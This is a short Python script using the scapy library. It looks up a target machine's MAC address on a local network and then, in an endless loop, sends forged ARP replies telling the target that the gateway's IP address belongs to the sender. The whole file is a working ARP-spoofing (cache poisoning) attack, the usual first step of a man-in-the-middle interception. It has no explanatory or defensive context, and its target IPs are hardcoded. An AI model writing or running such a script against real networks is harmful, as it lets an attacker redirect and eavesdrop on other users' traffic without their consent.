import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether


def spoof(target_ip, target_mac, spoof_ip):
    spoofed_arp_packet = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    scapy.send(spoofed_arp_packet,verbose=0)


def get_mac(ip):
    arp_request = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip)
    reply, _ = scapy.srp(arp_request, timeout=3, verbose=0, iface="en0")

    if reply:
        return reply[0][1].src
    return None


gateway_ip = "192.168.1.1"
target_ip = "192.168.1.119"

target_mac = None

while not target_mac:
    target_mac = get_mac(target_ip)
    if not target_mac:
        print("mac address for target not found!")


print(f'target mac address: {target_mac}')

while True:
    spoof(target_ip, target_mac, spoof_ip=gateway_ip)
    print("spoofing")